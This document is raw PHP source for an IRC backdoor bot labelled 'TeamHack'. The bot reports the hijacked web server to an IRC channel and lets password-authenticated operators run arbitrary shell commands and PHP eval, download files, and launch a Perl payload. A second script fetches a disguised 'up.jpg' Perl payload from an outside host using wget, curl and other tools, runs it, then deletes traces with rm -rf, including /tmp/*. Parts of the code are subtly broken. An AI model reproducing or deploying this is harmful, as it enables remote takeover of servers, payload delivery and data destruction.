<?

set_time_limit(0);
error_reporting(0);
echo "TeamHack!";

class pBot
{
 var $config = array("server"=>"irc.ganyot.biz",
                     "port"=>"6667",
                     "pass"=>"",
                     "prefix"=>"KerAwuK|",
                     "maxrand"=>"03",
                     "chan"=>"#teamhack",
                     "chan2"=>"#12345",
                     "key"=>"",
                     "modes"=>"+p",
                     "password"=>"sporty",
                     "trigger"=>".",
                     "hostauth"=>"*" // * for any hostname ( remember: /setvhost lAgi.seRius.sCan )
                     );
 var $users = array();
 function start()
 {
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
       $this->start();
    $ident = $this->config['prefix'];
    $alph = range("0","100");
    for($i=0;$i<$this->config['maxrand'];$i++)
       $ident .= $alph[rand(0,100)];
    if(strlen($this->config['pass'])>0)
       $this->send("PASS ".$this->config['pass']);
    $this->send("USER ".$ident." 127.0.0.1 localhost :4..:7�4:..8 ".php_uname()." 4..:7�4:..");
    $this->set_nick();
    $this->main();
 }
 function main()
 {
    while(!feof($this->conn))
    {
       $this->buf = trim(fgets($this->conn,512));
       $cmd = explode(" ",$this->buf);
       if(substr($this->buf,0,6)=="PING :")
       {
          $this->send("PONG :".substr($this->buf,6));
       }
       if(isset($cmd[1]) && $cmd[1] =="001")
       {
          $this->send("MODE ".$this->nick." ".$this->config['modes']);
          $this->join($this->config['chan'],$this->config['key']);
          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
          else { $safemode = "off"; }
          $uname = php_uname();
          $this->privmsg($this->config['chan2'],"[\2uname!\2]: $uname (safe: $safemode)");
          $this->privmsg($this->config['chan2'],"[\2vuln!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
       }
       if(isset($cmd[1]) && $cmd[1]=="433")
       {
          $this->set_nick();
       }
       if($this->buf != $old_buf)
       {
          $mcmd = array();
          $msg = substr(strstr($this->buf," :"),2);
          $msgcmd = explode(" ",$msg);
          $nick = explode("!",$cmd[0]);
          $vhost = explode("@",$nick[1]);
          $vhost = $vhost[1];
          $nick = substr($nick[0],1);
          $host = $cmd[0];
          if($msgcmd[0]==$this->nick)
          {
           for($i=0;$i<count($msgcmd);$i++)
              $mcmd[$i] = $msgcmd[$i+1];
          }
          else
          {
           for($i=0;$i<count($msgcmd);$i++)
              $mcmd[$i] = $msgcmd[$i];
          }
          if(count($cmd)>2)
          {
             switch($cmd[1])
             {
                case "QUIT":
                   if($this->is_logged_in($host))
                   {
                      $this->log_out($host);
                   }
                break;
                case "PART":
                   if($this->is_logged_in($host))
                   {
                      $this->log_out($host);
                   }
                break;
                case "PRIVMSG":
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))
                   {
                      if(substr($mcmd[0],0,1)==".")
                      {
                         switch(substr($mcmd[0],1))
                         {
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: 4 Siap 8 Boss $nick"); 
                                 $this->log_in($host); 
                              } 
                              else 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: 9 Si 8 $nick 4 MaLing....!!"); 
                              } 
                            break;
                         }
                      }
                   }
                   elseif($this->is_logged_in($host))
                   {
                      if(substr($mcmd[0],0,1)==".")
                      {
                         switch(substr($mcmd[0],1))
                         {
                            case "loadperl":
                               if(count($mcmd)>2)
                               {
                                  $this->loadperl($mcmd[1]);
                               }
                            break;
                            case "dns":
                               if(isset($mcmd[1]))
                               {
                                  $ip = explode(".",$mcmd[1]);
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
                                  }
                                  else
                                  {
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
                                  }
                               }
                            break;
                            case "info":
                            case "bot":
                               $this->privmsg($this->config['chan'],"[\212TeamHack4-8Bot\2]");
                            break;
                            case "rndnick":
                               $this->set_nick();
                            break;
                            case "raw":
                               $this->send(strstr($msg,$mcmd[1]));
                            break;
                            case "eval":
                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
                            break;
                            case "sexec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = shell_exec($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                            break;

                            case "exec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = exec($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                            break;

                            case "passthru":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = passthru($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                            break;

                            case "popen":
                               if(isset($mcmd[1]))
                               {
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                  $this->privmsg($this->config['chan'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r");
                                  while(!feof($pipe))
                                  {
                                     $pbuf = trim(fgets($pipe,512));
                                     if($pbuf != NULL)
                                        $this->privmsg($this->config['chan'],"     : $pbuf");
                                  }
                                  pclose($pipe);
                               }  

                            case "system":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = system($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
                            break;

                            case "download":
                               if(count($mcmd) > 2)
                               {
                                  if(!$fp = fopen($mcmd[2],"w"))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download. Permissao denied.");
                                  }
                                  else
                                  {
                                     if(!$get = file($mcmd[1]))
                                     {
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download de \2".$mcmd[1]."\2");
                                     }
                                     else
                                     {
                                        for($i=0;$i<=count($get);$i++)
                                        {
                                           fwrite($fp,$get[$i]);
                                        }
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Arquivo \2".$mcmd[1]."\2 baixado para \2".$mcmd[2]."\2");
                                     }
                                     fclose($fp);
                                  }
                               }
                               else { $this->privmsg($this->config['chan'],"[\2download\2]: use .download http://sman2-wng.sch.id/new/config1/thumbs/"); }
                            break;
                            case "logout":
                               $this->log_out($host);
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick deslogado!");
                            break;
                         }
                      }
                   }
                break;
             }
          }
       }
       $old_buf = $this->buf;
    }
    $this->start();
 }
 function send($msg)
 {
    fwrite($this->conn,"$msg\r\n");

 }
 function join($chan,$key=NULL)
 {
    $this->send("JOIN $chan $key");
 }
 function privmsg($to,$msg)
 {
    $this->send("PRIVMSG $to :$msg");
 }
 function notice($to,$msg)
 {
    $this->send("NOTICE $to :$msg");
 }
 function is_logged_in($host)
 {
    if(isset($this->users[$host]))
       return 1;
    else
       return 0;
 }
 function log_in($host)
 {
    $this->users[$host] = true;
 }
 function log_out($host)
 {
    unset($this->users[$host]);
 }
 function set_nick()
 {
    if(isset($_SERVER['SERVER_SOFTWARE']))
    {
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache"))
          $this->nick = "[A]";
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis"))
          $this->nick = "[I]";
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami"))
          $this->nick = "[X]";
       else
          $this->nick = "[U]";
    }
    else
    {
       $this->nick = "[C]";
    }
    $this->nick .= $this->config['prefix'];
    for($i=0;$i<$this->config['maxrand'];$i++)
       $this->nick .= mt_rand(0,9);
    $this->send("NICK ".$this->nick);
 }
  function loadperl($ip)
 {
    $this->privmsg($this->config['chan'],"[\2loadperl\2]: loadperl ke $ip");
    $dc_source = "wget http://sman2-wng.sch.id/new/config1/thumbs/bj.txt";
    if (is_writable("/tmp"))
    {
      if (file_exists("/tmp/bj.txt")) { unlink("/tmp/bj.txt"); }
      $fp=fopen("/tmp/bj.txt","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /tmp/bj.txt $ip &");
      unlink("/tmp/bj.txt");
    }
    else
    {
    if (is_writable("/var/tmp"))
    {
      if (file_exists("/var/tmp/bj.txt")) { unlink("/var/tmp/bj.txt"); }
      $fp=fopen("/var/tmp/bj.txt","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /var/tmp/bj.txt $ip &");
      unlink("/var/tmp/bj.txt");
    }
    if (is_writable("."))
    {
      if (file_exists("bj.txt")) { unlink("bj.txt"); }
      $fp=fopen("bj.txt","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl bj.txt $ip &");
      unlink("bj.txt");
    }
    }
  }

}

$bot = new pBot; 
$bot->start(); 

?>

shell bot running
<?
shell_exec("cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*");
shell_exec('cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('cd /tmp;curl -O http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('cd /tmp;lwp-download http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('cd /tmp;lynx -source http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('cd /tmp;fetch http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('cd /tmp;GET http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
shell_exec('rm -rf up.jpg');
shell_exec('rm -rf *.jpg');
shell_exec('rm -rf up.jpg*');
shell_exec('rm -rf *.jpg.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg.*');
passthru('rm -rf up.jpg');
passthru('rm -rf *.jpg');
passthru('rm -rf up.jpg*');
passthru('rm -rf *.jpg.*');
passthru("cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*");
passthru('cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('cd /tmp;curl -O http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('cd /tmp;lwp-download http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('cd /tmp;lynx -source http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('cd /tmp;fetch http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('cd /tmp;GET http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
passthru('rm -rf up.jpg');
passthru('rm -rf *.jpg');
passthru('rm -rf up.jpg*');
passthru('rm -rf *.jpg.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg.*');
exec("cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*");
exec('cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;curl -O http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;lwp-download http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;lynx -source http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;fetch http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;GET http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('rm -rf up.jpg');
exec('rm -rf *.jpg');
exec('rm -rf up.jpg*');
exec('rm -rf *.jpg.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg.*');
passthru('rm -rf up.jpg');
passthru('rm -rf *.jpg');
passthru('rm -rf up.jpg*');
passthru('rm -rf *.jpg.*');
exec("cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*");
exec('cd /tmp; wget http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;curl -O http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;lwp-download http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;lynx -source http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;fetch http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
exec('cd /tmp;GET http://sman2-wng.sch.id/new/config1/thumbs/up.jpg;perl up.jpg;perl up.jpg.*');
system('rm -rf up.jpg');
system('rm -rf *.jpg');
system('rm -rf up.jpg*');
system('rm -rf *.jpg.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg');
shell_exec('rm -rf /tmp/*.jpg.*');
passthru('rm -rf up.jpg');
passthru('rm -rf *.jpg');
passthru('rm -rf up.jpg*');
passthru('rm -rf *.jpg.*');
?>